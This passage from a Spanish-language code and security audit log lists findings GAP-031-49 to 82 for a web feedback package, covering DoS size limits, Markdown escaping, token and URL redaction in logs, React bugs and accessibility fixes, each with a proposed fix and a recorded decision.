    throw new Error(`Unexpected upload URL host: ${new URL(uploadData.uploadUrl).hostname}`);
}
```

**Recomendacion:** Solucionar directo. Fix de seguridad importante.

**Decision:** ✅ HACER. Validar host de presigned URL contra allowlist S3. (2026-03-09)

---

### GAP-031-49: No hay limite de tamano de body antes de parsear formData() [Audit #5]

**Severidad:** CRITICA
**Prioridad:** CRITICA
**Complejidad:** 1
**Categoria:** Seguridad / DoS / Resource exhaustion

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:179-189`:

```typescript
formData = await ctx.req.formData();
```

No hay check de `Content-Length` ni body-size limit antes de esta llamada. `formData()` lee el body completo en memoria. Un atacante puede enviar un request de 500MB y el servidor lo buferea todo antes de llegar a las validaciones de archivos.

**Solucion propuesta:**
Validar Content-Length antes de parsear:
```typescript
const contentLength = Number(ctx.req.header('content-length') ?? 0);
const MAX_BODY = FEEDBACK_CONFIG.maxAttachments * FEEDBACK_CONFIG.maxFileSize + 64 * 1024;
if (contentLength > MAX_BODY) {
    return ctx.json({ success: false, error: { code: 'PAYLOAD_TOO_LARGE', message: 'Request too large' } }, 413);
}
```

**Recomendacion:** Solucionar directo INMEDIATAMENTE. Fix critico anti-DoS.

**Decision:** ✅ HACER. Agregar body size limit antes de formData() parse. (2026-03-09)

---

### GAP-031-50: Todos los buffers de archivos se mantienen en memoria simultaneamente [Audit #5]

**Severidad:** CRITICA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Seguridad / DoS / Memory

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:328-338`:

```typescript
const feedbackAttachments: FeedbackAttachment[] = await Promise.all(
    attachments.map(async (file) => {
        const arrayBuffer = await file.arrayBuffer();
        return { buffer: Buffer.from(arrayBuffer), ... };
    })
);
```

5 archivos de 10MB = 50MB en Buffer simultaneos. Durante retries (hasta 7s de backoff), los buffers se retienen. Con 30 requests concurrentes (el rate limit por IP), el proceso podria consumir hasta 1.5GB de heap solo en attachment buffers.

**Solucion propuesta:**
1. Procesar attachments secuencialmente y subirlos a Linear uno por uno (liberar buffer despues de cada upload)
2. O imponer un limite agregado (ej: 20MB total por request, no solo 10MB por archivo)

**Recomendacion:** Solucionar directo. Complementa GAP-031-49.

**Decision:** ✅ HACER Opción A. Procesar attachments secuencialmente liberando buffer después de cada upload. (2026-03-09)

---

### GAP-031-51: withRetry reintenta errores no-retriable (4xx de Linear) [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Correctness / Performance

**Descripcion:**
En `apps/api/src/services/feedback/retry.ts:62-78`, `withRetry` captura y reintenta todos los errores incondicionalmente. Si Linear retorna 400 (bad request) o 401/403 (auth), el sistema espera 1s+2s+4s = 7 segundos haciendo 3 llamadas inutiles a una API que rechaza permanentemente.

**Solucion propuesta:**
Agregar predicado `isRetriable` a las opciones de retry:
```typescript
isRetriable?: (error: Error) => boolean;
// Default: retry on 5xx/network errors, abort on 4xx
```

**Recomendacion:** Solucionar directo. Mejora diagnostico y reduce latencia en errores de config.

**Decision:** ✅ HACER. Agregar predicado isRetriable a withRetry (retry solo 5xx/network). (2026-03-09)

---

### GAP-031-52: Campo `data` JSON no tiene limite de tamano antes de JSON.parse [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / DoS

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:199-224`, el campo `data` del multipart form se parsea con `JSON.parse(dataStr)` sin verificar su longitud. Un payload JSON de 10MB con estructuras profundamente anidadas causa picos de CPU y memoria.

**Solucion propuesta:**
```typescript
const MAX_DATA_FIELD_BYTES = 32 * 1024; // 32KB
if (dataStr.length > MAX_DATA_FIELD_BYTES) {
    return ctx.json({ success: false, error: { code: 'VALIDATION_ERROR', message: 'Campo data demasiado grande' } }, 400);
}
```

**Recomendacion:** Solucionar directo. Fix de una linea.

**Decision:** ✅ HACER. Agregar límite de 32KB al campo data antes de JSON.parse. (2026-03-09)

---

### GAP-031-53: consoleErrors array sin limite de tamano en schema del servidor [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / DoS / Validacion

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:64-65`:

```typescript
consoleErrors: z.array(z.string()).optional(),
```

Sin limite de items ni de longitud por string. Un atacante puede enviar miles de strings largos que se embeden en el body del issue de Linear.

**Solucion propuesta:**
```typescript
consoleErrors: z.array(z.string().max(500)).max(20).optional(),
```

**Recomendacion:** Solucionar directo. Fix de una linea.

**Decision:** ✅ HACER. Agregar .max(500) por string y .max(20) al array de consoleErrors. (2026-03-09)

---

### GAP-031-54: errorInfo.stack puede escapar del code fence de Markdown en Linear [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / Injection

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:450-453`:

```typescript
const stackPart = env.errorInfo.stack ? `\n\`\`\`\n${env.errorInfo.stack}\n\`\`\`` : '';
```

Un stack trace crafteado con triple-backtick puede cerrar el code fence y luego inyectar Markdown arbitrario (headers, links, imagenes externas). Esto complementa GAP-031-38 pero es un vector distinto: usa la semantica del code fence para escapar.

**Solucion propuesta:**
Escapar backticks en el stack antes de embedir:
```typescript
const escapedStack = env.errorInfo.stack?.replace(/`/g, "'");
```

**Recomendacion:** Solucionar junto con GAP-031-38.

**Decision:** ✅ HACER. Escapar backticks en stack traces (junto con GAP-031-38). (2026-03-09)

---

### GAP-031-55: Presigned URL de S3 con credenciales logueada a nivel debug [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Seguridad / Information disclosure

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:278`:

```typescript
logger.debug({ uploadUrl: uploadData.uploadUrl }, 'PUT file to Linear presigned URL');
```

Las presigned URLs contienen `X-Amz-Signature`, `X-Amz-Credential`, y `X-Amz-Security-Token` como query params. Estas credenciales temporales se escriben en logs.

**Solucion propuesta:**
Loguear solo host y path, sin query params:
```typescript
const urlForLog = new URL(uploadData.uploadUrl);
logger.debug({ uploadHost: urlForLog.hostname, uploadPath: urlForLog.pathname }, 'PUT file to Linear presigned URL');
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Redactar query params de presigned URL en logs. (2026-03-09)

---

### GAP-031-56: FeedbackFAB en web no recibe datos del usuario autenticado [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Funcionalidad incompleta / Desviacion de spec

**Descripcion:**
En `apps/web/src/layouts/BaseLayout.astro:108-112`:

```astro
<FeedbackFAB client:idle apiUrl={getApiUrl()} appSource="web" />
```

No pasa `userId`, `userEmail` ni `userName`. En contraste, el admin SI los pasa desde la sesion. `Astro.locals.user` esta disponible en el frontmatter pero no se usa.

**Impacto:** Usuarios autenticados en web ven el formulario vacio (email/nombre) y los reportes llegan sin `userId`.

**Solucion propuesta:**
```astro
const user = Astro.locals.user;
<FeedbackFAB client:idle apiUrl={getApiUrl()} appSource="web"
  userId={user?.id} userEmail={user?.email} userName={user?.name} />
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Pasar userId/userEmail/userName de Astro.locals.user al FeedbackFAB en web. (2026-03-09)

---

### GAP-031-57: Admin feedbackPageUrl es URL relativa que apunta al dominio del admin [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Bug / Funcionalidad rota

**Descripcion:**
En `apps/admin/src/routes/__root.tsx:150`:

```tsx
feedbackPageUrl="/es/feedback"
```

URL relativa se resuelve contra el origen del admin (ej: `admin.hospeda.com/es/feedback`). Esa pagina NO existe. La standalone feedback page esta en el dominio web (`hospeda.com/es/feedback`). Cuando el admin crashea tan gravemente que el modal inline tambien falla, el fallback abre una URL rota.

**Solucion propuesta:**
Usar URL absoluta del web:
```tsx
feedbackPageUrl={`${env.VITE_WEB_URL || 'https://hospeda.com'}/es/feedback/`}
```

**Recomendacion:** Solucionar directo INMEDIATAMENTE. Fix critico de funcionalidad.

**Decision:** ✅ HACER. Usar URL absoluta del dominio web con env.VITE_SITE_URL. (2026-03-09)

---

### GAP-031-58: Tooltip del FAB duplica anuncio en lectores de pantalla [Audit #5]

**Severidad:** ALTA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Accesibilidad / a11y

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:503-511`:

```tsx
<button aria-label={FEEDBACK_STRINGS.fab.tooltip}>
    <BugIcon />
    {isHovered && <span role="tooltip">{FEEDBACK_STRINGS.fab.tooltip}</span>}
</button>
```

El tooltip con `role="tooltip"` esta DENTRO del button, duplicando el texto de `aria-label`. Un screen reader lee el texto dos veces. Ademas, `role="tooltip"` requiere `aria-describedby` apuntando al tooltip ID.. sin esa relacion, la semantica es incorrecta.

**Solucion propuesta:**
Mover el tooltip fuera del button y usar `aria-describedby`:
```tsx
<div style={{ position: 'relative' }}>
    <button aria-describedby={isHovered ? 'fab-tooltip' : undefined} aria-label={FEEDBACK_STRINGS.fab.tooltip}>
        <BugIcon />
    </button>
    {isHovered && <span id="fab-tooltip" role="tooltip">{FEEDBACK_STRINGS.fab.tooltip}</span>}
</div>
```

**Recomendacion:** Solucionar directo. Fix de accesibilidad.

**Decision:** ✅ HACER. Mover tooltip fuera del button y usar aria-describedby. (2026-03-09)

---

### GAP-031-59: Boton minimizar tiene 18x18px, viola WCAG 2.5.8 (min 24x24px) [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Accesibilidad / Touch target

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:153-170`:

```tsx
const MINIMIZE_BTN: React.CSSProperties = { width: '18px', height: '18px' };
```

WCAG 2.5.8 (AA en WCAG 2.2) requiere minimo 24x24px para targets de interaccion. 18x18px es practicamente imposible de activar en mobile.

**Solucion propuesta:**
Usar padding para aumentar el area de toque sin cambiar el tamano visual:
```tsx
const MINIMIZE_BTN: React.CSSProperties = { width: '18px', height: '18px', padding: '13px', margin: '-13px' };
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Aumentar touch target del botón minimizar a mín 24x24px. (2026-03-09)

---

### GAP-031-60: useFeedbackSubmit no usa AbortController, setState en componente desmontado [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Bug / React anti-pattern

**Descripcion:**
En `packages/feedback/src/hooks/useFeedbackSubmit.ts:75-141`, si el usuario cierra el modal mientras el fetch esta en vuelo, la promesa resuelve y llama `setState` en un componente desmontado. No hay `AbortController` ni ref de mounted.

**Solucion propuesta:**
```typescript
const abortRef = useRef<AbortController | null>(null);
// dentro de submit:
abortRef.current = new AbortController();
const response = await fetch(url, { method: 'POST', body: formData, signal: abortRef.current.signal });
// cleanup:
useEffect(() => () => { abortRef.current?.abort(); }, []);
```

**Recomendacion:** Solucionar directo. Fix estandar de React.

**Decision:** ✅ HACER. Agregar AbortController a useFeedbackSubmit. (2026-03-09)

---

### GAP-031-61: useAutoCollect no actualiza environment cuando props cambian [Audit #5]

**Severidad:** ALTA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Bug / Stale data

**Descripcion:**
En `packages/feedback/src/hooks/useAutoCollect.ts:95-111`:

```typescript
const [environment, setEnvironment] = useState<FeedbackEnvironment>(() =>
    collectEnvironmentData({ appSource: input.appSource, deployVersion: input.deployVersion, userId: input.userId, ... })
);
```

`useState` initializer ejecuta solo una vez. Si `userId` llega asincronamente (auth session resuelve despues del mount), el environment nunca se actualiza. El reporte se envia sin userId.

**Solucion propuesta:**
Agregar `useEffect` que actualice cuando las props relevantes cambien:
```typescript
useEffect(() => {
    setEnvironment(prev => ({ ...prev, userId: input.userId, deployVersion: input.deployVersion, errorInfo: input.errorInfo }));
}, [input.userId, input.deployVersion, input.errorInfo]);
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Agregar useEffect para actualizar environment cuando props cambian. (2026-03-09)

---

### GAP-031-62: useConsoleCapture: multiples instancias corrompen restauracion de console.error [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Bug / Race condition

**Descripcion:**
En `packages/feedback/src/hooks/useConsoleCapture.ts:41-69`:

```typescript
useEffect(() => {
    const originalError = console.error;
    console.error = (...args: unknown[]) => { ... };
    return () => { console.error = originalError; };
}, []);
```

Si instancia A monta primero e instancia B despues, `originalError` de B es la version parcheada de A. Al desmontar B se restaura la version de A. Al desmontar A se restaura la version original saltandose el parche de B. El estado final de `console.error` es impredecible con mount/unmount intercalado.

**Solucion propuesta:**
Usar singleton con reference counting.. solo restaurar el original cuando el ultimo consumidor se desmonta.

**Recomendacion:** Solucionar directo. Complementa GAP-031-25.

**Decision:** ✅ HACER. Refactor a singleton con reference counting (se resuelve junto con GAP-031-04). (2026-03-09)

---

### GAP-031-63: useKeyboardShortcut se dispara dentro de inputs de texto [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** UX / Bug funcional

**Descripcion:**
En `packages/feedback/src/hooks/useKeyboardShortcut.ts:43-46`:

```typescript
const isCtrlOrCmd = ctrl ? event.ctrlKey || event.metaKey : true;
```

No hay check de `event.target`. Si `ctrl: false` en la config, `isCtrlOrCmd` siempre es `true`, y cualquier tecla `f` en un input de texto activa el shortcut. Incluso con la config actual (`ctrl: true, shift: true`), Ctrl+Shift+F dentro de un textarea abre el modal en vez de ejecutar la accion del textarea.

**Solucion propuesta:**
Ignorar el shortcut cuando el target es un elemento editable:
```typescript
const target = event.target as HTMLElement;
if (target.isContentEditable || ['INPUT', 'TEXTAREA', 'SELECT'].includes(target.tagName)) return;
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Ignorar keyboard shortcut cuando target es INPUT/TEXTAREA/SELECT. (2026-03-09)

---

### GAP-031-64: collectEnvironmentData expone OAuth tokens via window.location.href [Audit #5]

**Severidad:** MEDIA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / Data leakage

**Descripcion:**
En `packages/feedback/src/lib/collector.ts:67`:

```typescript
currentUrl: isBrowser ? window.location.href : undefined,
```

`window.location.href` incluye query string y hash. URLs de callback OAuth contienen `access_token`, `code`, o `state`. Estos tokens se envian a Linear como parte del issue body.

**Solucion propuesta:**
Usar `window.location.origin + window.location.pathname` para strip query params.

**Recomendacion:** Solucionar directo. Fix de seguridad critico.

**Decision:** ✅ HACER. Strip query params de window.location.href en collector. (2026-03-09)

---

### GAP-031-65: Export `./schemas/server` en package.json apunta a archivo inexistente [Audit #5]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Build / API rota

**Descripcion:**
En `packages/feedback/package.json:15-18`:

```json
"./schemas/server": {
    "types": "./dist/schemas/server.d.ts",
    "import": "./dist/schemas/server.js"
},
```

No existe `src/schemas/server.ts`. Cualquier import de `@repo/feedback/schemas/server` falla con module-not-found.

**Solucion propuesta:**
Crear `src/schemas/server.ts` con el schema de servidor (que acepta Buffer en vez de File), o eliminar el export.

**Recomendacion:** Solucionar directo. Fix critico de build.

**Decision:** ✅ HACER. Crear src/schemas/server.ts o eliminar export roto. (2026-03-09)

---

### GAP-031-66: Exports `./schemas` y `./config` apuntan a barrel files inexistentes [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Build / API rota

**Descripcion:**
`packages/feedback/package.json` declara exports `./schemas` y `./config` apuntando a `dist/schemas/index.js` y `dist/config/index.js`, pero no existen `src/schemas/index.ts` ni `src/config/index.ts`.

**Solucion propuesta:**
Crear barrel files que re-exporten los modulos:
- `src/schemas/index.ts`: re-export de `feedback.schema.ts`
- `src/config/index.ts`: re-export de `feedback.config.ts` y `strings.ts`

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Crear barrel files src/schemas/index.ts y src/config/index.ts. (2026-03-09)

---

### GAP-031-67: Mobile drawer sin boton de cierre visible [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** UX / Accesibilidad

**Descripcion:**
En `packages/feedback/src/components/FeedbackModal.tsx:338-356`:

```tsx
{!isMobile && (
    <button type="button" onClick={onClose} aria-label={FEEDBACK_STRINGS.buttons.close}>&#x2715;</button>
)}
```

El boton de cierre (X) solo se renderiza en desktop. En mobile el drawer no tiene affordance visible para cerrarse (solo backdrop click o Escape con teclado fisico). Usuarios mobile quedan "atrapados".

**Solucion propuesta:**
Agregar boton de cierre tambien en mobile, cerca del drag handle.

**Recomendacion:** Solucionar directo. Fix importante de UX mobile.

**Decision:** ✅ HACER. Agregar botón cerrar al mobile drawer. (2026-03-09)

---

### GAP-031-68: `<dialog open>` estatico omite beneficios de `.showModal()` nativo [Audit #5]

**Severidad:** MEDIA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Accesibilidad / UX

**Descripcion:**
En `packages/feedback/src/components/FeedbackModal.tsx:304-320`:

```tsx
<dialog aria-modal="true" open style={{ ... }}>
```

El atributo `open` estatico (en vez de `.showModal()`) pierde: top-layer nativo (supera z-index), focus trap automatico, backdrop nativo, Escape nativo. El componente reimplementa todo esto manualmente con riesgo de bugs.

**Solucion propuesta:**
Usar ref + `.showModal()` / `.close()` en respuesta al prop `isOpen`.

**Recomendacion:** Postergar para refactor de accesibilidad.

**Decision:** ✅ HACER. Migrar a .showModal()/.close() nativo con ref. (2026-03-09)

---

### GAP-031-69: accept="image/*" permite tipos que luego son rechazados por el validador [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** UX / Inconsistencia

**Descripcion:**
En `packages/feedback/src/components/steps/StepDetails.tsx:413-421`:

```tsx
<input type="file" accept="image/*" multiple />
```

`accept="image/*"` permite al OS mostrar BMP, TIFF, SVG, AVIF, HEIC, etc. El validador solo acepta PNG, JPEG, WebP, GIF. El usuario selecciona un .HEIC y recibe un error confuso.

**Solucion propuesta:**
```tsx
<input type="file" accept={FEEDBACK_CONFIG.allowedFileTypes.join(',')} multiple />
```

**Recomendacion:** Solucionar directo. Fix de una linea.

**Decision:** ✅ HACER. Usar FEEDBACK_CONFIG.allowedFileTypes en accept del input file. (2026-03-09)

---

### GAP-031-70: setState en catch de render() en FeedbackErrorBoundary [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Bug / React anti-pattern

**Descripcion:**
En `packages/feedback/src/components/FeedbackErrorBoundary.tsx:369-376`:

```typescript
} catch {
    this.setState({ showInlineForm: false }); // setState durante render()
    return null;
}
```

`renderInlineModal` se llama desde `render()`. Llamar `setState` durante render en un class component causa re-render inmediato y comportamiento indefinido en React 18.

**Solucion propuesta:**
Usar microtask para escapar del ciclo de render:
```typescript
Promise.resolve().then(() => this.setState({ showInlineForm: false }));
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Usar microtask (Promise.resolve().then) para setState en catch de render. (2026-03-09)

---

### GAP-031-71: Standalone feedback page no tiene ErrorBoundary wrapping [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Resiliencia / Desviacion de spec

**Descripcion:**
En `apps/web/src/pages/[lang]/feedback.astro:114-119`:

```astro
<FeedbackForm client:load apiUrl={apiUrl} appSource="standalone" prefillData={prefillData} />
```

El FeedbackForm en la standalone page no esta wrapeado por FeedbackErrorBoundary. Si el form crashea (datos prefill malformados, crash en useAutoCollect), el usuario ve pantalla en blanco. Ironia: la pagina de reporte de errores no puede reportar sus propios errores.

**Solucion propuesta:**
Wrapear con FeedbackErrorBoundary que, en caso de crash, muestre fallback mailto (no el feedback URL, para evitar loop infinito).

**Recomendacion:** Solucionar directo.

**Decision:** ✅ HACER. Wrapear standalone FeedbackForm con ErrorBoundary + fallback mailto. (2026-03-09)

---

### GAP-031-72: Standalone page usa client:load en vez de client:only="react" [Audit #5]

**Severidad:** MEDIA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Resiliencia

**Descripcion:**
`client:load` intenta SSR y luego hidratar. Para una pagina de last resort, `client:only="react"` es mas seguro porque omite SSR completamente.

**Recomendacion:** Solucionar directo. Cambio de una palabra.

**Decision:** ✅ HACER. Cambiar client:load a client:only="react" en standalone page. (2026-03-09)

---

### GAP-031-73: 429 status nunca manejado especificamente en el cliente [Audit #5]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** UX / Funcionalidad incompleta

**Descripcion:**
En `packages/feedback/src/hooks/useFeedbackSubmit.ts`, no hay check de `response.status === 429`. El string `FEEDBACK_STRINGS.rateLimit.message` existe pero nunca se usa. El usuario ve el error generico del API en ingles.

**Solucion propuesta:**
```typescript
if (response.status === 429) {
    setState({ isSubmitting: false, error: FEEDBACK_STRINGS.rateLimit.message, result: null });
    return;
}
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Manejar 429 con FEEDBACK_STRINGS.rateLimit.message en cliente. (2026-03-09)

---

### GAP-031-74: Boton "Agregar detalles" desactivado sin cambio visual [Audit #5]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** UX / Affordance

**Descripcion:**
En `StepBasic.tsx:348-355`, el boton "Agregar mas detalles" recibe `disabled={isSubmitting}` pero mantiene el estilo activo (`styles.buttonSecondary`). El usuario ve un boton que parece clickeable pero no responde.

**Solucion propuesta:**
Agregar estilo disabled: `opacity: 0.5, cursor: 'not-allowed'`.

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Agregar estilo visual disabled (opacity, cursor) al botón. (2026-03-09)

---

### GAP-031-75: typeHovered state y event handlers son dead code [Audit #5]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Dead code / Code quality

**Descripcion:**
En `StepBasic.tsx:170-176`, `typeHovered` state, `setTypeHovered`, y los handlers `onMouseEnter`/`onMouseLeave` del select nunca producen efecto visible. `getInputStyle('type')` nunca se llama porque el select usa su propio estilo inline.

**Solucion propuesta:**
Eliminar `typeHovered`, `setTypeHovered` y los event handlers.

**Recomendacion:** Solucionar directo. Eliminar dead code.

**Decision:** ✅ HACER. Eliminar typeHovered dead code. (2026-03-09)

---

### GAP-031-76: Keyboard shortcut hardcodeado en tooltip puede divergir del config [Audit #5]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** DRY / Mantenibilidad

**Descripcion:**
En `packages/feedback/src/config/strings.ts:37`, el tooltip dice `'Reportar un problema (Ctrl+Shift+F)'` pero el shortcut real se define en `FEEDBACK_CONFIG.keyboardShortcut`. Si se cambia el shortcut en config, el tooltip queda desactualizado.

**Solucion propuesta:**
Derivar el tooltip dinamicamente del config, o agregar un helper `formatShortcut()`.

**Recomendacion:** Solucionar directo. Fix trivial de DRY.

**Decision:** ✅ HACER. Derivar tooltip del keyboard shortcut config dinámicamente. (2026-03-09)

---

### GAP-031-77: useConsoleCapture serializa Error como {} via JSON.stringify [Audit #5]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Bug funcional

**Descripcion:**
En `packages/feedback/src/hooks/useConsoleCapture.ts:48-55`:

```typescript
return typeof arg === 'string' ? arg : JSON.stringify(arg);
```

`JSON.stringify(new Error('msg'))` retorna `{}` porque las propiedades de Error son non-enumerable. Los errores capturados llegan vacios al reporte.

**Solucion propuesta:**
```typescript
return arg instanceof Error ? `${arg.name}: ${arg.message}` : JSON.stringify(arg);
```

**Recomendacion:** Solucionar directo. Fix trivial.

**Decision:** ✅ HACER. Manejar Error instances con arg.name + arg.message en serialización. (2026-03-09)

---

### GAP-031-78: feedback_report categorizado como TRANSACTIONAL contamina billing_notification_log [Audit #5]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Correctness / Categoria incorrecta

**Descripcion:**
En `packages/notifications/src/config/notification-categories.ts:27`, `FEEDBACK_REPORT` esta como `TRANSACTIONAL`. Los reportes de feedback no son transacciones de billing pero se registran en `billing_notification_log` a menos que `skipDb: true` se pase explicitamente. Nada en el codigo fuerza que `skipDb` se use.

**Solucion propuesta:**
Crear una categoria `INTERNAL` que no registre en billing_notification_log, o forzar `skipDb: true` en el `send()` para feedback_report.

**Recomendacion:** Postergar para refactor de notifications.

**Decision:** ✅ HACER. Crear categoría INTERNAL en notifications + forzar skipDb: true para feedback_report. Ambas soluciones juntas para mayor robustez. (2026-03-09)

---

### GAP-031-79: outline: 'none' en inputs/textareas/FAB elimina indicador de foco (WCAG 2.1 AA) [Audit #6]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Accesibilidad / WCAG 2.4.7

**Descripcion:**
Multiples archivos del paquete feedback aplican `outline: 'none'` a elementos interactivos sin proporcionar un indicador de foco alternativo:

- `StepBasic.tsx:63,85`: `input` y `textarea` styles con `outline: 'none'`
- `StepDetails.tsx:63,78`: idem para `input` y `textarea` styles
- `FeedbackFAB.tsx:121`: `FAB_BASE` aplica `outline: 'none'` al boton principal

WCAG 2.4.7 (Focus Visible, Level AA) requiere que todos los elementos interactivos tengan un indicador de foco visible cuando reciben focus via teclado. Al usar estilos inline, no es posible aplicar `:focus-visible` como pseudo-clase CSS.

**Impacto:** Usuarios de teclado (accesibilidad) no pueden ver que elemento tiene el foco al navegar el formulario de feedback con Tab. Falla directa de WCAG 2.1 Level AA.

**Solucion propuesta:**
1. **Opcion A (minima):** Agregar handlers `onFocus`/`onBlur` que modifiquen el estilo del borde para simular un focus ring:
```typescript
const [isFocused, setIsFocused] = useState(false);
// En el elemento: onFocus={() => setIsFocused(true)} onBlur={() => setIsFocused(false)}
// Estilo: boxShadow: isFocused ? '0 0 0 2px #2563eb' : 'none'
```
2. **Opcion B (mejor):** Inyectar un `<style>` global al mount del componente con `:focus-visible` rules:
```typescript
useEffect(() => {
    const style = document.createElement('style');
    style.textContent = '.feedback-input:focus-visible { outline: 2px solid #2563eb; outline-offset: 2px; }';
    document.head.appendChild(style);
    return () => style.remove();
}, []);
```
3. **Opcion C (ideal):** Eliminar `outline: 'none'` completamente y confiar en el outline nativo del navegador (funciona automaticamente).

**Recomendacion:** Opcion C es la mas simple y correcta. Solucionar directo.

**Decision:** ✅ HACER Opción C. Eliminar outline:'none' completamente, confiar en outline nativo. (2026-03-09)

---

### GAP-031-80: feedbackErrorInfoSchema definido pero no usado dentro de feedbackEnvironmentSchema [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Code quality / DRY / Violacion Single Source of Truth

**Descripcion:**
En `packages/feedback/src/schemas/feedback.schema.ts`, existen dos definiciones identicas del schema de error info:

1. Lineas 67-73: Inline dentro de `feedbackEnvironmentSchema`:
```typescript
errorInfo: z.object({
    message: z.string(),
    stack: z.string().optional()
}).optional()
```

2. Lineas 78-81: Exportado como `feedbackErrorInfoSchema`:
```typescript
export const feedbackErrorInfoSchema = z.object({
    message: z.string(),
    stack: z.string().optional()
});
```

El segundo existe explicitamente para reusar, pero no se usa dentro del primero. Si alguien agrega un campo a `feedbackErrorInfoSchema` (e.g., `componentStack`), la version inline no lo tendra.

**Solucion propuesta:**
```typescript
// Reemplazar la definicion inline:
errorInfo: feedbackErrorInfoSchema.optional()
```

**Recomendacion:** Solucionar directo. Fix de una linea.

**Decision:** ✅ HACER. Usar feedbackErrorInfoSchema.optional() inline en vez de duplicar. (2026-03-09)

---

### GAP-031-81: handleSubmit en FeedbackForm ejecuta feedbackFormSchema.safeParse() dos veces [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Performance / Code quality

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:400-413`:

```typescript
const handleSubmit = useCallback(async () => {
    if (!validate()) return;        // Primer safeParse
    // ...
    const parsed = feedbackFormSchema.safeParse(combined); // Segundo safeParse
    if (!parsed.success) return;
    await submit(parsed.data, ...);
}, [...]);
```

`validate()` ya ejecuta `feedbackFormSchema.safeParse(combined)` internamente. `handleSubmit` ejecuta el mismo parse una segunda vez con datos identicos. El doble-parse es redundante y agrega latencia innecesaria (Zod no es trivialmente barato para schemas complejos con refinements).

**Solucion propuesta:**
Hacer que `validate()` retorne el resultado parseado:
```typescript
const validate = useCallback((): z.infer<typeof feedbackFormSchema> | null => {
    const combined = { ...basicData, ...detailsData, environment };
    const result = feedbackFormSchema.safeParse(combined);
    if (!result.success) { ... return null; }
    return result.data;
}, [...]);

const handleSubmit = useCallback(async () => {
    const validated = validate();
    if (!validated) return;
    await submit(validated, ...);
}, [...]);
```

**Recomendacion:** Solucionar directo. Refactor trivial que elimina redundancia.

**Decision:** ✅ HACER. Retornar resultado de validate() y reusar en handleSubmit. (2026-03-09)

---

### GAP-031-82: buildInitialBasicData hardcodea 'bug-js' como tipo por defecto [Audit #6]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Mantenibilidad / Fragilidad

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:172`:

```typescript
type: prefillData?.type ?? 'bug-js',
```

El valor `'bug-js'` esta hardcodeado. Si `REPORT_TYPE_IDS` cambia de orden o `'bug-js'` se renombra/elimina en `feedback.schema.ts`, este default apuntara a un tipo invalido silenciosamente.

**Solucion propuesta:**
```typescript
